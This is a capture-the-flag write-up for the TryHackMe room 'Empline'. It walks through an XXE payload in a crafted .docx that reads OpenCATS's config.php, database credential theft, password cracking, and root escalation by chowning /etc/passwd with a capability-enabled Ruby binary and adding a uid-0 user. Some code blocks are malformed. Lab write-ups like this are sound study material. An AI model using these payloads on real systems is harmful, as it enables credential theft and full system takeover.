# Introduction

Empline is a boot2root style hacking challenge created by [zyeinn](https://tryhackme.com/p/zyeinn) over at [TryHackMe](https://tryhackme.com/room/empline). It involves a web application vulnerable to XXE, a MariaDB database, and chowing files with Ruby. Here’s how I solved it.

# Getting the user flag

I started by performing a port scan with Nmap. It returned that 22, 80, and 3306 were running SSH, HTTP, and MySQL, respectively.

```bash
nmap -sCV -oN nmap/initial <IP>
Nmap scan report for <IP>
Host is up (0.11s latency).
Not shown: 997 closed ports

Further enumerating, the webserver hosted a static single-page website.

I looked for interesting files or directories, but there was not much going on. One specific subdomain showed up when fuzzing for virtual hosts.

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://empline.thm  -H "Host: FUZZ.empline.thm" -fs 14058

```

job.empline.thm was running opencats, an open-source applicant tracking system.

![image](https://miro.medium.com/max/700/1*ie4pjAC5ij5vX8IdMkcsbA.png)

I quickly found a known vulnerability by searching on Google for version 0.9.4 which was disclosed on the login page: read the article [here](https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/).

Directory bruteforcing with Gobuster revealed the path to the careers portal.

```

Following the instructions from the doddsecurity article above, I created a .docx document using Python.

```python
#!/usr/bin/env python3
from docx import Document
document = Document()
paragraph = document.add_paragraph("infamous55")
document.save("document.docx")
```

Then, I unzipped it with `unzip document.docx`. I added the following as the second line to the newly created word/document.xml file, and I replaced my username with **&test;** as well.

```
<!DOCTYPE test [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=config.php'>]>
```

After saving and recreating the document, I uploaded it to the job post and got back the base64 encoded configuration file. Reading the contents of _config.php_, I got the credentials for connecting to the MySQL database.

```
define('DATABASE_USER', 'james');
define('DATABASE_PASS', '<REDACTED>');
```

Once authenticated, I checked the available databases and tables.

```bash
mysql -h empline.thm -u james -p

MariaDB [opencats]> select * from user;
```

There I found the hashed password for the george user. I cracked it on [https://crackstation.net/](https://crackstation.net/), then I connected using SSH and got the user flag.

```bash
> ssh george@empline.thm
george@empline:~$ wc -c user.txt
33 user.txt
```

# Getting the root flag

As for local enumeration, I ran linpeas.sh on the target machine. The script showed one particular result:

```
Files with capabilities:
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/local/bin/ruby = cap_chown+ep
```

This meant that I could chown files using Ruby. The one file I could also read and use to my advantage that came to my mind was _/etc/passwd_. Here’s the Ruby script I used:

```ruby
file = File.new("/etc/passwd", "r")
file.chown(1002, 1002)
```

Note that 1002 is the id of the user george.

Next, I added a new root user in the _/etc/passwd_ file.

```
infamous55:<HASHED_PASS>:0:0:root:/root:/bin/bash
```

**\<HASHED_PASS\>** represents the hashed password I created using `mkpasswd -m sha-512` on my local machine.

After that, I switched to the newly created user and read the final flag.

```
george@empline:/tmp$ su infamous55
Password: <YOUR_PASS>
root@empline:/tmp# wc -c /root/root.txt
33 /root/root.txt
```

# Conclusion

Overall, I enjoyed this room. The privilege escalation part using Ruby stood out to me, and I think it was well-made. Thank you to the creator of this challenge, and thank you for reading my writeup!
